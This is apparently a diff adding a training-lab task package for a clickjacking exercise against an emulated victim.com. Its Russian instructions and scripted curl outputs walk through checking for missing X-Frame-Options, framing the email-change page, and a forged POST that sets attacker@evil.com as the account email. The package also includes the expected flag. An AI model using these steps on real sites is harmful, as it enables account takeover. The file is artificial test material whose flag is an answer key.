@@ -1,0 +1,47 @@
+{
+  "id": "web-clickjacking",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{cl1ckj4ck3d_3ma1l_ch4ng3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: clickjacking на смене email\n\nЦель — `victim.com/account/email`.\n\n1. Проверь защиту от фрейминга:\n\n   curl -sI https://victim.com/account/email | grep -i frame\n\n   Пусто → страницу можно встроить в `iframe`.\n\n2. Собери `clickjack.html`: прозрачный `iframe` (`opacity:0.0001`) с целевой\n   страницей и приманка-кнопка поверх нужного элемента.\n\n3. Сымитируй клик жертвы (клик уходит в iframe, действие выполняется с её\n   cookie) и сохрани результат в `found.txt`:\n\n   curl -s -X POST https://victim.com/account/email -d 'email=attacker@evil.com' -H 'Cookie: session=victim' > found.txt\n\n4. Набери `check` — он проверит и PoC (`clickjack.html`), и результат.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция victim.com)",
+      "cases": [
+        {
+          "match": "-d|--data|-x\\s*post|\\bpost\\b",
+          "example": "-X POST https://victim.com/account/email -d email=attacker@evil.com",
+          "output": "HTTP/1.1 302 Found\nLocation: https://victim.com/account\n\n[click] iframe click landed on the email form (victim session, valid CSRF token)\n[profile] email changed: victim@corp.com -> attacker@evil.com\n[reset] password reset link issued to attacker@evil.com\nnto{cl1ckj4ck3d_3ma1l_ch4ng3}\n"
+        },
+        {
+          "match": "-si|--head|\\b-i\\b",
+          "example": "-sI https://victim.com/account/email",
+          "output": "HTTP/1.1 200 OK\nContent-Type: text/html\nServer: nginx\n(нет X-Frame-Options, нет CSP frame-ancestors)\n"
+        },
+        {
+          "match": "account/email",
+          "example": "-s https://victim.com/account/email",
+          "output": "<!doctype html>\n<title>Смена email — victim.com</title>\n<form action=\"/account/email\" method=\"POST\">\n  <input type=\"email\" name=\"email\" value=\"victim@corp.com\">\n  <button type=\"submit\">Сохранить</button>\n</form>\n"
+        },
+        {
+          "match": "victim\\.com",
+          "example": "-s https://victim.com/",
+          "output": "<!doctype html><title>victim.com</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется victim.com.\n"
+    }
+  }
+}
